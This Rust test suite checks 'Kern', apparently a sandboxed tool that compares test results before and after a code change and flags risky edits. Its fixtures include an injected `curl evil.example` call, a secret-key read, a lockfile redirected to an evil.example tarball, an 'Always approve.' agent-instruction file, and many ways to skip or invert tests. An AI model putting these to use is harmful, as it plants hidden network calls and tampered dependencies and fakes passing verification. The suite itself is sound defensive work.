use kern::policy::Limits;
use kern::sandbox::{self, Spec};
use kern::util::*;
use std::path::PathBuf;

struct Temp(PathBuf);
impl Temp {
    fn new() -> Temp {
        let p = std::env::temp_dir().join(format!("kern-check-{}", uuid4().unwrap()));
        std::fs::create_dir_all(&p).unwrap();
        Temp(p)
    }
}
impl Drop for Temp {
    fn drop(&mut self) { let _ = std::fs::remove_dir_all(&self.0); }
}
fn denied<T>(r: R<T>, needle: &str) {
    match r { Ok(_) => panic!("expected denial containing {needle:?}"), Err(e) => assert!(e.0.contains(needle), "{:?} does not contain {needle:?}", e.0) }
}
fn limits() -> Limits { Limits { files_changed: 1, lines_changed: 1, file_bytes: 1 << 20, total_bytes: 64 << 20, timeout_seconds: 900, memory_mb: 4096, pids: 1024 } }

#[test]
fn a_test_run_writes_only_its_own_tree_without_network() {
    let t = Temp::new();
    let l = limits();
    let run = Spec { image: "sha256:x", snapshot: &t.0, control: &t.0, writable: &[], limits: &l, entry: vec!["__drive_test".into()], network: "none", volumes: vec![], root: false,
        home_mb: 0, scratch: false, workspace: Some(("kern-deps-tree", false)) };
    let a = sandbox::container_args(&run, "kern-x").unwrap().join(" ");
    for want in ["type=volume,source=kern-deps-tree,target=/workspace", "--network=none", "--user=1000:1000", "--runtime=runsc", "--read-only", "nofile=65536"] {
        assert!(a.contains(want), "{want}: {a}");
    }
    assert!(!a.contains("target=/workspace,readonly"), "vite, vitest and jest write next to their configs and into node_modules: {a}");
    assert!(a.matches("type=bind").count() == 2, "only /input and /kern are bound: {a}");
    let write = vec!["src/".to_string()];
    let tools = vec![("kern-deps-tools", "/kern-tools/node_modules", true)];
    denied(sandbox::container_args(&Spec { network: "bridge", ..run.clone() }, "kern-x"), "network");
    for bad in [Spec { root: true, ..run.clone() }, Spec { writable: &write, ..run.clone() }, Spec { workspace: None, ..run.clone() }, Spec { scratch: true, ..run.clone() },
        Spec { volumes: tools.clone(), ..run.clone() }] {
        denied(sandbox::container_args(&bad, "kern-x"), "test run");
    }
}

#[test]
fn a_seal_owns_only_its_tree_as_root_without_network_and_two_rights() {
    let t = Temp::new();
    let l = limits();
    let seal = Spec { image: "sha256:x", snapshot: &t.0, control: &t.0, writable: &[], limits: &l, entry: vec!["__drive_seal".into()], network: "none", volumes: vec![], root: true,
        home_mb: 0, scratch: false, workspace: Some(("kern-deps-tree", false)) };
    let a = sandbox::container_args(&seal, "kern-x").unwrap().join(" ");
    for want in ["--network=none", "--user=0:0", "--cap-drop=ALL", "--cap-add=CHOWN", "--cap-add=DAC_OVERRIDE", "type=volume,source=kern-deps-tree,target=/workspace"] {
        assert!(a.contains(want), "{want}: {a}");
    }
    assert_eq!(a.matches("--cap-add").count(), 2, "{a}");
    let tools = vec![("kern-deps-tools", "/kern-tools/node_modules", true)];
    for bad in [Spec { root: false, ..seal.clone() }, Spec { network: "bridge", ..seal.clone() }, Spec { workspace: Some(("kern-deps-tree", true)), ..seal.clone() }, Spec { volumes: tools, ..seal.clone() }] {
        assert!(sandbox::container_args(&bad, "kern-x").is_err(), "a seal is root, offline and writes one tree only");
    }
    let test = Spec { entry: vec!["__drive_test".into()], root: false, ..seal.clone() };
    assert!(!sandbox::container_args(&test, "kern-x").unwrap().join(" ").contains("--cap-add"), "no other run gets a right back");
}

#[test]
fn a_test_run_report_is_read_by_length() {
    let mut out = Vec::new();
    for (name, body) in [("output", &b"{\"stats\":{}}\n"[..]), ("errors", b""), ("behavior", b"exec:id\n"), ("created", b"src/total.mjs"), ("ending", b"exit 1"), ("values", b"{\"name\":\"adds\"}\n"),
        ("trace", b"{\"k\":\"src/total.mjs#total\",\"a\":\"[]\",\"o\":\"returns 0\"}\n")] {
        out.extend(format!("{}{name} {}\n", sandbox::DRIVE_MARK, body.len()).as_bytes());
        out.extend(body);
    }
    let parts = sandbox::parts(&out, &sandbox::TEST_PARTS).unwrap();
    assert_eq!(parts["ending"], b"exit 1");
    assert_eq!(parts["values"], b"{\"name\":\"adds\"}\n");
    assert_eq!(parts["trace"], b"{\"k\":\"src/total.mjs#total\",\"a\":\"[]\",\"o\":\"returns 0\"}\n");
    assert_eq!(parts["behavior"], b"exec:id\n");
    assert_eq!(parts["created"], b"src/total.mjs");
    let mut forged = out.clone();
    forged.extend(b"more");
    denied(sandbox::parts(&forged, &sandbox::TEST_PARTS), "unexpected data");
    denied(sandbox::parts(&out[..out.len() - 2], &sandbox::TEST_PARTS), "incomplete");
}

use kern::proof::{Count, Report};
use kern::suite;
use std::collections::BTreeMap;

fn report(tests: &[(&str, u32, u32, u32)], problems: &[&str]) -> Report {
    let mut t = BTreeMap::new();
    for (k, passed, failed, skipped) in tests { t.insert(k.to_string(), Count { passed: *passed, failed: *failed, skipped: *skipped }); }
    Report { tests: t, problems: problems.iter().map(|p| p.to_string()).collect(), why: BTreeMap::new() }
}
fn names(v: &serde_json::Value, key: &str) -> Vec<String> { v[key].as_array().unwrap_or_else(|| panic!("{key}: {v}")).iter().map(|x| x.as_str().unwrap().to_string()).collect() }

#[test]
fn compare_names_broken_gone_skipped_and_added_tests() {
    let before = report(&[("t > adds", 1, 0, 0), ("t > rounds", 1, 0, 0), ("t > old only", 1, 0, 0), ("t > soon skipped", 1, 0, 0), ("t > needs the internet", 0, 1, 0)], &[]);
    let after = report(&[("t > adds", 1, 0, 0), ("t > rounds", 0, 1, 0), ("t > soon skipped", 0, 0, 1), ("t > needs the internet", 0, 1, 0), ("t > brand new", 1, 0, 0)], &["t2.test.js"]);
    let again = report(&[("t > adds", 1, 0, 0), ("t > rounds", 0, 1, 0), ("t > soon skipped", 0, 0, 1), ("t > needs the internet", 0, 1, 0), ("t > brand new", 1, 0, 0)], &["t2.test.js"]);
    let c = suite::compare(&before, &after, Some(&again));
    assert_eq!(names(&c, "broke"), ["t > rounds"], "passed before, failed twice now");
    assert_eq!(names(&c, "gone"), ["t > old only"], "ran before, does not run now");
    assert_eq!(names(&c, "newly_skipped"), ["t > soon skipped"]);
    assert_eq!(names(&c, "added"), ["t > brand new"]);
    assert_eq!(names(&c, "already_failing"), ["t > needs the internet"], "failing before the change: set aside, never blamed on it");
    assert_eq!(names(&c, "new_problems"), ["t2.test.js"], "a test file that no longer loads is a failure outside any test");
    assert_eq!(c["kept"], 1, "one test passed before and still passes");
    assert!(names(&c, "flaky").is_empty());
}

#[test]
fn a_runner_that_found_no_tests_on_either_side_did_not_test_anything() {
    let empty = report(&[], &[]);
    let c = suite::compare(&empty, &empty, None);
    assert_eq!(c["status"], "NOT_RUN", "zero tests passing before and after is not a pass: {c}");
    assert!(c["why"].as_str().unwrap().contains("found no tests"), "{c}");
    let r = receipt::build(&drive_json(), &clean_rules(), &c);
    assert_eq!(r["decision"], "unverified", "Kern tested nothing, so it says it could not verify the change, not that it needs a look: {r}");
    assert!(receipt::markdown(&r).contains("found no tests"), "{r}");
}

#[test]
fn every_runner_writes_its_report_to_a_file_kern_names() {
    let tests = |runner: &str| kern::suite::detect(Some(format!(r#"{{"devDependencies":{{"{runner}":"1.0.0"}}}}"#).as_bytes())).unwrap();
    let joined = |runner: &str| kern::suite::test_command(&tests(runner)).join(" ");
    assert!(joined("vitest").contains("--outputFile=/tmp/.kern-report.json"), "{}", joined("vitest"));
    assert!(joined("mocha").contains("--reporter-options output=/tmp/.kern-report.json"), "the plural is the one every mocha knows; AudienseCo/monorail's mocha refused the singular: {}", joined("mocha"));
    let node = kern::suite::test_command(&kern::suite::detect(Some(br#"{"scripts":{"test":"node --test"}}"#)).unwrap()).join(" ");
    assert!(node.contains("--test-reporter=/kern/node-report.mjs --test-reporter-destination=/tmp/.kern-report.json"), "{node}");
    assert_eq!(kern::suite::test_command(&tests("jest"))[..kern::proof::command(&tests("jest")).len()], kern::proof::command(&tests("jest")), "jest writes the file through Kern's own results processor");
    assert!(joined("jest").ends_with("--bail=false --reporters=default --reporters=/kern/jest-progress.cjs"), "{}", joined("jest"));
    assert!(joined("vitest").ends_with("--bail=0 --sequence.shuffle=false --reporter=/kern/vitest-progress.mjs"),
        "promptfoo sets bail: 1 in CI and shuffles its files, so each run stopped at a different first failure; the worker count comes from the CPUs the box shows, never a flag (marathon-store-app's vitest 2 found no tests with --maxWorkers): {}", joined("vitest"));
}

#[test]
fn tests_that_run_on_the_old_code_but_give_nothing_on_the_new_code_block() {
    let mut t = clean_tests();
    t["run_broke"] = json!([{ "dir": "", "why": "the runner stopped before running any test (exit 1); its first error: Error: the test config cannot load" }]);
    let r = receipt::build(&drive_json(), &clean_rules(), &t);
    assert_eq!((r["decision"].as_str(), kinds(&r, "blocked")), (Some("blocked"), vec!["test-run-broke".to_string()]), "{r}");
    let broke = json!({ "status": "BROKE", "why": "the tests run on the old code but give no results on the new code", "run_broke": [{ "dir": "packages/kit", "why": "the output contains no vitest report (exit 1); its first error: SyntaxError: Unexpected token '<'" }] });
    let r = receipt::build(&drive_json(), &clean_rules(), &broke);
    let md = receipt::markdown(&r);
    assert!(r["decision"] == "blocked" && md.contains("packages/kit") && md.contains("❌ Tests"), "{md}");
}

#[test]
fn a_test_named_with_the_time_it_ran_is_the_same_test_on_both_sides() {
    let before = report(&[("t > throws for Thu Oct 15 2026 19:50:54 GMT+0000", 1, 0, 0), ("t > adds 1 and 2", 1, 0, 0)], &[]);
    let after = report(&[("t > throws for Thu Oct 15 2026 19:52:07 GMT+0000", 1, 0, 0), ("t > adds 1 and 2", 1, 0, 0)], &[]);
    let c = suite::compare(&before, &after, None);
    assert!(names(&c, "gone").is_empty() && names(&c, "added").is_empty(), "{c}");
    assert_eq!(c["kept"], 2, "{c}");
    let after = report(&[("t > throws for Thu Oct 15 2026 19:52:07 GMT+0000", 0, 1, 0), ("t > adds 1 and 2", 1, 0, 0)], &[]);
    assert_eq!(names(&suite::compare(&before, &after, None), "broke").len(), 1, "a renamed-by-the-clock test that now fails still blocks");
    let after = report(&[("t > adds 3 and 4", 1, 0, 0)], &[]);
    let c = suite::compare(&report(&[("t > adds 1 and 2", 1, 0, 0)], &[]), &after, None);
    assert!(names(&c, "gone").is_empty() && names(&c, "added").is_empty(), "only digits differ, so it is the same test: {c}");
}

#[test]
fn a_test_the_change_adds_that_fails_needs_a_look() {
    let before = report(&[("t > adds", 1, 0, 0)], &[]);
    let after = report(&[("t > adds", 1, 0, 0), ("t > new and red", 0, 1, 0), ("t > new and green", 1, 0, 0)], &[]);
    let c = suite::compare(&before, &after, None);
    assert_eq!(names(&c, "new_failing"), ["t > new and red"], "{c}");
    let r = receipt::build(&drive_json(), &clean_rules(), &c);
    assert_eq!((r["decision"].as_str(), kinds(&r, "look")), (Some("look"), vec!["new-test-fails".to_string()]), "{r}");
    assert!(r["look"][0]["what"].as_str().unwrap().contains("t > new and red"), "{r}");
}

#[test]
fn a_test_that_wrote_code_into_the_project_needs_a_look() {
    let mut t = clean_tests();
    t["wrote_code"] = json!(["src/total.mjs"]);
    let r = receipt::build(&drive_json(), &clean_rules(), &t);
    assert_eq!((r["decision"].as_str(), kinds(&r, "look")), (Some("look"), vec!["wrote-code".to_string()]), "{r}");
    assert!(r["look"][0]["what"].as_str().unwrap().contains("src/total.mjs"), "{r}");
}

#[test]
fn a_test_that_fails_once_is_flaky_not_broken() {
    let before = report(&[("t > a", 1, 0, 0), ("t > b", 1, 0, 0)], &[]);
    let after = report(&[("t > a", 0, 1, 0), ("t > b", 1, 0, 0)], &[]);
    let again = report(&[("t > a", 1, 0, 0), ("t > b", 1, 0, 0)], &[]);
    let c = suite::compare(&before, &after, Some(&again));
    assert!(names(&c, "broke").is_empty(), "{c}");
    assert_eq!(names(&c, "flaky"), ["t > a"]);
    assert_eq!(c["kept"], 2, "both pass on the second run");
    assert_eq!(names(&suite::compare(&before, &after, None), "broke"), ["t > a"]);
}

#[test]
fn a_test_run_without_results_says_how_it_ended_and_what_it_printed_last() {
    let errors = b"[31mError: getaddrinfo ENOTFOUND fastdl.mongodb.org[0m
    at GetAddrInfoReqWrap.onlookup (node:dns:120:26)

";
    let why = kern::suite::no_results("the output contains no mocha report", b"exit 1", errors, b"");
    assert!(why.starts_with("the output contains no mocha report (exit 1)"), "{why}");
    assert!(why.contains("ENOTFOUND fastdl.mongodb.org") && !why.contains(''), "the last lines it printed, without terminal colours: {why}");
    let why = kern::suite::no_results("the output contains no vitest report", b"exit 1", b"", b"line one
Error: Failed to load url @cloudflare/workers-shared (resolved id: @cloudflare/workers-shared)
");
    assert!(why.contains("Failed to load url @cloudflare/workers-shared"), "{why}");
    let long = "x".repeat(5000);
    assert!(kern::suite::no_results("no report", b"exit 1", long.as_bytes(), b"").chars().count() <= 600);
}

#[test]
fn in_a_monorepo_the_tests_are_those_of_the_packages_a_change_touches() {
    let manifests = ["apps/web/package.json", "packages/kit/package.json", "packages/kit/fixtures/app/package.json"];
    let has = |dir: &str| manifests.contains(&format!("{dir}/package.json").as_str());
    let changed = ["packages/kit/src/runtime/a.js", "packages/kit/test/a.test.js", "apps/web/src/page.tsx", "README.md", "scripts/release.js",
        "packages/kit/fixtures/app/src/x.js", "node_modules/x/index.js"];
    assert_eq!(kern::suite::packages(&changed, has), ["apps/web", "packages/kit", "packages/kit/fixtures/app"]);
    assert!(kern::suite::packages(&["src/a.js"], has).is_empty(), "a file outside every package belongs to the root");
}

#[test]
fn a_test_run_gets_three_quarters_of_the_machine_s_memory_within_bounds() {
    assert_eq!(kern::suite::test_memory_mb(Some("MemTotal:       16374420 kB\nMemFree:  1 kB\n")), 11992);
    assert_eq!(kern::suite::test_memory_mb(Some("MemTotal:        7340032 kB\n")), 5376);
    assert_eq!(kern::suite::test_memory_mb(Some("MemTotal:       67108864 kB\n")), 12288);
    assert_eq!(kern::suite::test_memory_mb(Some("MemTotal:        2097152 kB\n")), 4096);
    assert_eq!(kern::suite::test_memory_mb(None), 4096);
    assert_eq!(kern::suite::test_memory_mb(Some("nonsense")), 4096);
}

#[test]
fn a_package_s_test_run_finds_its_runner_up_the_tree() {
    let at = |p: &str| ["/workspace/packages/kit/node_modules/.bin/vitest", "/workspace/node_modules/.bin/jest"].contains(&p);
    assert_eq!(kern::sandbox::runner_in("packages/kit", "/workspace/node_modules/.bin/vitest", at), "/workspace/packages/kit/node_modules/.bin/vitest");
    assert_eq!(kern::sandbox::runner_in("packages/kit", "/workspace/node_modules/.bin/jest", at), "/workspace/node_modules/.bin/jest");
    assert_eq!(kern::sandbox::runner_in("", "/workspace/node_modules/.bin/mocha", at), "/workspace/node_modules/.bin/mocha", "nothing found: the command as it was");
    assert_eq!(kern::sandbox::runner_in("packages/kit", "/usr/local/bin/node", at), "/usr/local/bin/node");
    for bad in ["../x", "/etc", "a/../../b", "a//b", "a/./b", "a\\b", "a\0b"] { assert!(kern::sandbox::test_dir(bad).is_err(), "{bad}"); }
    assert_eq!(kern::sandbox::test_dir("packages/kit").unwrap(), "/workspace/packages/kit");
    assert_eq!(kern::sandbox::test_dir("").unwrap(), "/workspace");
}

#[test]
fn detect_finds_vitest_jest_mocha_and_node_test() {
    let runner = |pkg: &str| suite::detect(Some(pkg.as_bytes())).map(|t| (t.runner.name(), t.command));
    assert_eq!(runner(r#"{"devDependencies":{"vitest":"3"}}"#).unwrap(), ("vitest", vec!["/workspace/node_modules/.bin/vitest".to_string(), "run".into()]));
    assert_eq!(runner(r#"{"devDependencies":{"jest":"30"}}"#).unwrap().0, "jest");
    assert_eq!(runner(r#"{"dependencies":{"mocha":"11"}}"#).unwrap().0, "mocha");
    assert_eq!(runner(r#"{"scripts":{"test":"node --test test/"}}"#).unwrap().0, "node");
    assert!(runner(r#"{"scripts":{"test":"turbo test"}}"#).is_none(), "a runner Kern cannot read is named, not guessed");
    assert!(suite::detect(None).is_none() && suite::detect(Some(b"not json")).is_none());
}

#[test]
fn test_files_are_known_by_folder_and_by_name() {
    let paths = suite::test_paths(&["src/sum.ts", "src/sum.test.ts", "lib/x.spec.js", "test/helpers.js", "src/__tests__/y.js", "README.md"]);
    for want in ["test/", "src/sum.test.ts", "lib/x.spec.js", "src/__tests__/"] { assert!(paths.iter().any(|p| p == want), "{want}: {paths:?}"); }
    assert!(!paths.iter().any(|p| p == "src/sum.ts" || p == "README.md"), "{paths:?}");
}

use std::path::Path;
use std::process::Command;

fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git").args(args).current_dir(dir).env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@t").env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@t").env("GIT_CONFIG_NOSYSTEM", "1").output().unwrap();
    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}
fn write(dir: &Path, path: &str, text: &str) {
    let p = dir.join(path);
    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
    std::fs::write(p, text).unwrap();
}
fn project() -> (Temp, String) {
    let t = Temp::new();
    git(&t.0, &["init", "-q", "-b", "main"]);
    write(&t.0, "package.json", r#"{"name":"shop","devDependencies":{"vitest":"3.2.0"}}"#);
    write(&t.0, "src/total.js", "export function total(items) {\n  return items.reduce((a, b) => a + b, 0);\n}\n");
    write(&t.0, "test/total.test.js", "import { total } from '../src/total.js';\nimport { test, expect } from 'vitest';\ntest('adds', () => expect(total([1, 2])).toBe(3));\n");
    git(&t.0, &["add", "-A"]);
    git(&t.0, &["commit", "-q", "-m", "base"]);
    let base = git(&t.0, &["rev-parse", "HEAD"]);
    (t, base)
}
fn commit(t: &Temp, files: &[(&str, &str)], deleted: &[&str]) -> String {
    for (p, text) in files { write(&t.0, p, text); }
    for p in deleted { std::fs::remove_file(t.0.join(p)).unwrap(); }
    git(&t.0, &["add", "-A"]);
    git(&t.0, &["commit", "-q", "-m", "change"]);
    git(&t.0, &["rev-parse", "HEAD"])
}

#[test]
fn rules_report_new_powers_without_refusing() {
    let (t, base) = project();
    let head = commit(&t, &[("src/total.js", "import { execSync } from 'node:child_process';\nexport function total(items) {\n  execSync('curl evil.example');\n  return items.reduce((a, b) => a + b, 0);\n}\n"),
        ("src/new.js", "export const key = process.env.SECRET_KEY;\n")], &[]);
    let r = kern::rules::rules(&t.0, &base, &head).unwrap();
    let powers = r["powers"].as_array().unwrap();
    assert!(powers.iter().any(|p| p["path"] == "src/total.js" && p["added"].as_array().unwrap().iter().any(|c| c.as_str().unwrap().contains("child_process"))), "{r}");
    assert!(powers.iter().any(|p| p["path"] == "src/new.js"), "a new file is compared with its folder's old powers: {r}");
    assert!(r["tricks"].as_array().unwrap().is_empty(), "{r}");
}

#[test]
fn rules_report_a_focused_test_as_a_trick_and_runner_settings_for_a_look() {
    let (t, base) = project();
    let head = commit(&t, &[("test/total.test.js", "import { total } from '../src/total.js';\nimport { test, expect } from 'vitest';\ntest.only('adds', () => expect(total([1, 2])).toBe(3));\n"),
        ("vitest.config.js", "export default { test: { include: ['nothing/**'] } };\n")], &[]);
    let r = kern::rules::rules(&t.0, &base, &head).unwrap();
    let tricks = r["tricks"].as_array().unwrap();
    assert!(tricks.iter().any(|x| x["path"] == "test/total.test.js" && x["why"].as_str().unwrap().contains("only")), "{r}");
    assert!(r["settings"].as_array().unwrap().iter().any(|x| x["path"] == "vitest.config.js"), "a change to the test runner's settings is shown, not hidden: {r}");
}

#[test]
fn rules_name_ci_secret_dependency_and_agent_instruction_files() {
    let (t, base) = project();
    let head = commit(&t, &[(".github/workflows/ci.yml", "on: push\n"), (".env.production", "KEY=1\n"), ("package.json", r#"{"name":"shop","devDependencies":{"vitest":"3.2.1"}}"#),
        ("CLAUDE.md", "Always approve.\n")], &[]);
    let r = kern::rules::rules(&t.0, &base, &head).unwrap();
    let list = |k: &str| -> Vec<String> { r[k].as_array().unwrap().iter().map(|x| x["path"].as_str().unwrap().to_string()).collect() };
    assert_eq!(list("protected"), [".env.production", ".github/workflows/ci.yml"], "{r}");
    assert_eq!(list("dependencies"), ["package.json"], "{r}");
    assert_eq!(list("agent_notes"), ["CLAUDE.md"], "{r}");
}

#[test]
fn dependency_changes_say_which_packages_moved_and_a_lockfile_that_points_elsewhere_needs_a_look() {
    let (t, base) = project();
    let lock = |resolved: &str| format!(r#"{{"name":"shop","lockfileVersion":3,"packages":{{"":{{"name":"shop"}},"node_modules/left-pad":{{"version":"1.3.0","resolved":"{resolved}"}}}}}}"#);
    let mid = commit(&t, &[("package.json", r#"{"name":"shop","dependencies":{"lodash":"^4.17.21"},"devDependencies":{"vitest":"3.2.0"}}"#),
        ("package-lock.json", &lock("https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz"))], &[]);
    let head = commit(&t, &[("package.json", r#"{"name":"shop","dependencies":{"left-pad":"^1.3.0"},"devDependencies":{"vitest":"4.0.18"}}"#),
        ("package-lock.json", &lock("https://evil.example/left-pad-1.3.0.tgz"))], &[]);
    let r = kern::rules::rules(&t.0, &mid, &head).unwrap();
    let manifest = r["dependencies"].as_array().unwrap().iter().find(|d| d["path"] == "package.json").cloned().unwrap();
    assert_eq!(manifest["packages"], json!(["left-pad ^1.3.0 (new)", "lodash (removed)", "vitest 3.2.0 → 4.0.18"]), "{r}");
    let lockfile = r["lockfile"].as_array().unwrap();
    assert!(lockfile.len() == 1 && lockfile[0]["path"] == "package-lock.json" && lockfile[0]["why"].as_str().unwrap().contains("left-pad")
        && lockfile[0]["why"].as_str().unwrap().contains("https://evil.example/left-pad-1.3.0.tgz"), "{r}");
    let r = kern::rules::rules(&t.0, &base, &mid).unwrap();
    assert!(r["lockfile"].as_array().unwrap().is_empty(), "{r}");
}

#[test]
fn ordinary_imports_are_no_new_power_and_a_test_may_read_its_environment() {
    let (t, base) = project();
    let head = commit(&t, &[
        ("src/card.jsx", "import React from 'react';\nimport { total } from '@/lib/total';\nimport path from 'node:path';\nexport const Card = () => React.createElement('b', null, path.basename(String(total)));\n"),
        ("test/env.test.js", "import { test } from 'vitest';\ntest('reads its settings', () => process.env.CI);\n"),
        ("test/cli.test.js", "import { execSync } from 'node:child_process';\nimport { test } from 'vitest';\ntest('runs', () => execSync('true'));\n"),
        ("src/send.js", "import axios from 'axios';\nexport const send = (x) => axios.post('https://example.invalid', x);\n"),
    ], &[]);
    let r = kern::rules::rules(&t.0, &base, &head).unwrap();
    let powers: Vec<String> = r["powers"].as_array().unwrap().iter().map(|p| format!("{} {}", p["path"].as_str().unwrap(), p["added"])).collect();
    assert_eq!(powers.len(), 2, "the network package, and a test that starts programs: {powers:?}");
    assert!(powers.iter().any(|p| p.starts_with("src/send.js") && p.contains("axios")) && powers.iter().any(|p| p.starts_with("test/cli.test.js") && p.contains("child_process")), "{powers:?}");
}

#[test]
fn a_test_file_the_change_adds_needs_a_look_where_an_existing_one_would_block() {
    let (t, base) = project();
    let head = commit(&t, &[("test/browser.spec.js", "import { test } from 'vitest';\ntest.skip(!process.env.BROWSER, 'needs a browser');\ntest('opens', () => {});\n")], &[]);
    let rules = kern::rules::rules(&t.0, &base, &head).unwrap();
    assert_eq!(rules["tricks"][0]["operation"], "add", "{rules}");
    let mut tests = clean_tests();
    tests["new_problems"] = json!(["test/browser.spec.js"]);
    let r = receipt::build(&drive_json(), &rules, &tests);
    assert_eq!(r["decision"], "look", "a new test file cannot hide a test that passed before: {r}");
    assert_eq!(kinds(&r, "look"), ["new-test-fails", "new-test-skips"], "{r}");
    let head = commit(&t, &[("test/total.test.js", "import { total } from '../src/total.js';\nimport { test, expect } from 'vitest';\ntest.skip('adds', () => expect(total([1, 2])).toBe(3));\n")], &[]);
    let rules = kern::rules::rules(&t.0, &base, &head).unwrap();
    let mut tests = clean_tests();
    tests["new_problems"] = json!(["test/total.test.js"]);
    let r = receipt::build(&drive_json(), &rules, &tests);
    assert_eq!((r["decision"].as_str(), kinds(&r, "blocked")), (Some("blocked"), vec!["test-file".to_string(), "trick".to_string()]), "{r}");
}

#[test]
fn a_lockfile_names_a_new_download_host_once_and_a_checksum_that_changed_without_a_new_version() {
    let lock = |host: &str, integrity: &str| json!({ "packages": { "": { "name": "shop" },
        "node_modules/a": { "version": "1.0.0", "resolved": format!("https://{host}/a/-/a-1.0.0.tgz"), "integrity": integrity },
        "node_modules/b": { "version": "2.0.0", "resolved": format!("https://{host}/b/-/b-2.0.0.tgz"), "integrity": "sha512-b" } } });
    let moved = kern::deps::lock_surprises(&lock("registry.npmjs.org", "sha512-a"), &lock("npm.mirror.example", "sha512-a"));
    assert_eq!(moved.len(), 1, "one line per new host, not one per package: {moved:?}");
    assert!(moved[0].contains("2 packages") && moved[0].contains("npm.mirror.example"), "{moved:?}");
    let swapped = kern::deps::lock_surprises(&lock("registry.npmjs.org", "sha512-a"), &lock("registry.npmjs.org", "sha512-evil"));
    assert!(swapped.len() == 1 && swapped[0].contains("a 1.0.0") && swapped[0].contains("checksum"), "{swapped:?}");
    assert!(kern::deps::lock_surprises(&lock("npm.corp.example", "sha512-a"), &lock("npm.corp.example", "sha512-a")).is_empty(), "a host the lockfile already used is no surprise");
    let fresh = kern::deps::lock_surprises(&json!({}), &lock("registry.npmjs.org", "sha512-a"));
    assert!(fresh.is_empty(), "a new lockfile on the public registry is no surprise: {fresh:?}");
}

#[test]
fn one_rule_says_which_files_are_tests_and_production_code_cannot_hide_in_a_fixtures_folder() {
    for test in ["test/a.js", "tests/unit/a.ts", "src/__tests__/a.ts", "e2e/checkout.js", "cypress/e2e/login.cy.ts", "playwright/home.ts", "src/a.test.ts", "src/a.spec.js",
        "src/flow.e2e.ts", "src/api/__mocks__/client.js", "test/fixtures/data.js", "Tests/A.js"] {
        assert!(kern::suite::is_test_path(test), "{test}");
    }
    for code in ["src/fixtures/payments.js", "lib/mocks/http.js", "src/helpers/money.js", "src/ab-test.js", "src/contest.js", "src/testing.js", "testimonials/a.js"] {
        assert!(!kern::suite::is_test_path(code), "{code}");
    }
}

#[test]
fn a_repository_name_has_two_real_parts() {
    for ok in ["acme/shop", "a.b/c-d_e", "acme/.github"] { assert!(kern::github::repository(ok), "{ok}"); }
    for bad in ["../x", "acme/..", "./shop", "acme/.", "acme", "acme/shop/x", "acme/sh op", ""] { assert!(!kern::github::repository(bad), "{bad}"); }
}

fn tricks_for(t: &Temp, base: &str, text: &str) -> Vec<String> {
    let head = commit(t, &[("test/total.test.js", text)], &[]);
    let r = kern::rules::rules(&t.0, base, &head).unwrap();
    git(&t.0, &["reset", "-q", "--hard", base]);
    r["tricks"].as_array().unwrap().iter().map(|x| x["why"].as_str().unwrap().to_string()).collect()
}

#[test]
fn every_way_to_skip_focus_or_invert_an_existing_test_is_a_trick() {
    let (t, base) = project();
    let head = "import { total } from '../src/total.js';\n";
    for (name, body) in [
        ("mocha this.skip()", "import { it } from 'mocha';\nit('adds', function () { this.skip(); });\n"),
        ("the test context", "import { test } from 'vitest';\ntest('adds', (t) => { t.skip(); expect(total([1, 2])).toBe(3); });\n"),
        ("a destructured context", "import { test } from 'vitest';\ntest('adds', ({ skip }) => { skip(); });\n"),
        ("a destructured selector", "import { test } from 'vitest';\nconst { only } = test;\nonly('adds', () => {});\n"),
        ("a namespace import", "import * as v from 'vitest';\nv.test.skip('adds', () => {});\n"),
        ("a required alias", "const { test: check } = require('vitest');\ncheck.skip('adds', () => {});\n"),
        ("a chain with each", "import { it } from 'vitest';\nit.failing.each([1])('adds %i', () => {});\n"),
        ("a computed selector", "import { test } from 'vitest';\ntest['only']('adds', () => {});\n"),
        ("the skip option", "import { test } from 'node:test';\ntest('adds', { skip: true }, () => {});\n"),
    ] {
        assert!(!tricks_for(&t, &base, &format!("{head}{body}")).is_empty(), "{name} was not caught");
    }
    for (name, body) in [
        ("a skip on another platform", "import { test } from 'node:test';\ntest('adds', (t) => { if (process.platform === 'win32') t.skip(); });\n"),
        ("a method named skip", "import { test } from 'vitest';\nclass Store { skip() {} }\ntest('adds', () => { new Store().skip(); });\n"),
    ] {
        assert!(tricks_for(&t, &base, &format!("{head}{body}")).is_empty(), "{name} is no trick");
    }
}

#[test]
fn moving_a_skip_to_another_test_is_a_trick_and_a_query_s_skip_is_not() {
    let (t, _) = project();
    let before = "import { test } from 'vitest';\ntest.skip('needs the network', () => {});\ntest('adds', () => {});\n";
    let mid = commit(&t, &[("test/total.test.js", before)], &[]);
    let moved = tricks_for(&t, &mid, "import { test } from 'vitest';\ntest('needs the network', () => {});\ntest.skip('adds', () => {});\n");
    assert!(moved.iter().any(|w| w.contains("test.skip('adds')")), "the skip moved from one test to another: {moved:?}");
    let query = tricks_for(&t, &mid, "import { test } from 'vitest';\ntest.skip('needs the network', () => {});\ntest('adds', async () => { await Model.find().skip(10).limit(5); });\n");
    assert!(query.is_empty(), "a database query's skip is not a test trick: {query:?}");
}

#[test]
fn review_2_a1_a_skip_or_inversion_blocks_only_on_a_test_that_existed() {
    let (t, base) = project();
    let head = "import { total } from '../src/total.js';\nimport { test, it, expect } from 'vitest';\ntest('adds', () => expect(total([1, 2])).toBe(3));\n";
    for (name, body) in [
        ("a placeholder for later", "it.todo('refunds');\n"),
        ("a conditional skip, read like the skip option", "it.skipIf(process.platform === 'win32')('symlinks', () => {});\n"),
        ("a conditional run", "it.runIf(process.env.CI)('slow path', () => {});\n"),
        ("a new test written as skipped", "it.skip('new case', () => {});\n"),
        ("a known bug written as an expected failure", "test.fails('rounds half up', () => expect(total([0.5])).toBe(1));\n"),
    ] {
        let found = tricks_for(&t, &base, &format!("{head}{body}"));
        assert!(found.is_empty(), "{name} hides no test that existed: {found:?}");
    }
    for (name, body) in [
        ("skipping the test that existed", "import { test } from 'vitest';\ntest.skip('adds', () => {});\n"),
        ("inverting the test that existed", "import { test } from 'vitest';\ntest.fails('adds', () => {});\n"),
        ("a skipIf that always skips it", "import { it } from 'vitest';\nit.skipIf(true)('adds', () => {});\n"),
